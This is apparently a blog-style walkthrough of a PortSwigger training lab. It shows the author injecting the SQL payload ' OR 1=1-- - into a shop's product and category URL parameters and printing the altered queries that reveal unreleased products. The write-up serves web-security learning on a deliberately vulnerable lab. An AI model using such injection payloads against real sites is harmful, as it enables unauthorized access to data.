# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data), you'll learn: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032350.png)

**View-source:**
```html
<div theme="ecommerce">
            <section class="maincontainer">
                <div class="container">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="ecoms-pageheader">
                        <img src="/resources/images/shop.svg">
                    </section>
                    <section class="search-filters">
                        <label>Refine your search:</label>
                        <a href="/">All</a>
                        <a href="/filter?category=Food+%26+Drink">Food & Drink</a>
                        <a href="/filter?category=Gifts">Gifts</a>
                        <a href="/filter?category=Lifestyle">Lifestyle</a>
                        <a href="/filter?category=Pets">Pets</a>
                    </section>
                    <section class="container-list-tiles">
                        <div>
                            <img src="/image/productcatalog/products/20.jpg">
                            <h3>Single Use Food Hider</h3>
                            <img src="/resources/images/rating3.png">
                            $58.56
                            <a class="button" href="/product?productId=9">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/23.jpg">
                            <h3>Sprout More Brain Power</h3>
                            <img src="/resources/images/rating2.png">
                            $90.82
                            <a class="button" href="/product?productId=14">View details</a>
                        </div>
                        <div>
                            <img src="/image/productcatalog/products/52.jpg">
                            <h3>Hydrated Crackers</h3>
                            <img src="/resources/images/rating2.png">
                            $11.66
                            <a class="button" href="/product?productId=19">View details</a>
                        </div>
                        [...]
```

As you can see, **there is a `filter` page that accepts `category` GET parameter, and a `product` page that accepts `productId` GET parameter.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032838.png)

Hmm... What if I clicked one of the `View details` buttons?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203032910.png)

**It brings me to the `product` page with the `productId` GET parameter value `9`.**

What if I change the `9` to `1`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033024.png)

Hmm... Nothing weird.

**How about testing it for it is vulnerable to SQL injection?**

**Imagine this is the SQL statement of the `productId`:**
```sql
SELECT * FROM products WHERE productId = '1'
```

**What if I close that string with `'`, then returns always true via `OR 1=1`, then commented out the rest of the SQL statement?**

**Payload:**
```sql
/product?productId=1' OR 1=1-- -
```

**New SQL statement:**
```sql
SELECT * FROM products WHERE productId = '1' OR 1=1-- -
```

Will it returns every products?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033129.png)

Hmm... Nope. It requires a valid product ID.

**How about the `filter` page?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033640.png)

**Let's click the `Pets` filter!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203033708.png)

**Now the GET parameter value will be: `Pets`**

**Also, let's go back to the SQL statement that the lab gave us:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Hmm... Again, what if I let it returns always true via the `OR` clause?**  

**Payload:**
```sql
/filter?category=' OR 1=1-- -
```

**New SQL statement:**
```sql
SELECT * FROM products WHERE category = '' OR 1=1-- - AND released = 1
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203034318.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/SQL-Injection/SQLi-1/images/Pasted%20image%2020221203034331.png)

**Now we can see there are some unreleased items!!**

# Conclusion

What we've learned:

1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data